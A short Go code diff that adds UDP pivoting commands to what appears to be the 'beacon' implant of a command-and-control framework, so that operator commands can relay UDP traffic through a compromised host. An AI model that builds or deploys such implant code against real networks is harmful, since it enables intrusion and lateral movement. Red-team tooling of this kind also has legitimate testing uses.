@@ -285,6 +285,28 @@ func executeCommand(cmdType uint32, cmdBuf []byte, taskID [8]byte) {
 		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
 		pivot.Close(socketID)
 
+	case commands.CMD_TYPE_UDP_ASSOCIATE:
+		if len(cmdBuf) < 6 {
+			return
+		}
+		// socketID(4) + port(2) + host (ignored — beacon just opens a local UDP socket)
+		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
+		pivot.UDPAssociate(socketID)
+
+	case commands.CMD_TYPE_UDP_SEND:
+		if len(cmdBuf) < 10 {
+			return
+		}
+		socketID := binary.BigEndian.Uint32(cmdBuf[:4])
+		destPort := binary.BigEndian.Uint16(cmdBuf[4:6])
+		addrLen := binary.BigEndian.Uint32(cmdBuf[6:10])
+		if uint32(len(cmdBuf)) < 10+addrLen {
+			return
+		}
+		host := string(cmdBuf[10 : 10+addrLen])
+		payload := cmdBuf[10+addrLen:]
+		pivot.UDPSend(socketID, host, destPort, payload)
+
 	case commands.CMD_TYPE_LISTEN:
 		if len(cmdBuf) < 6 {
 			return
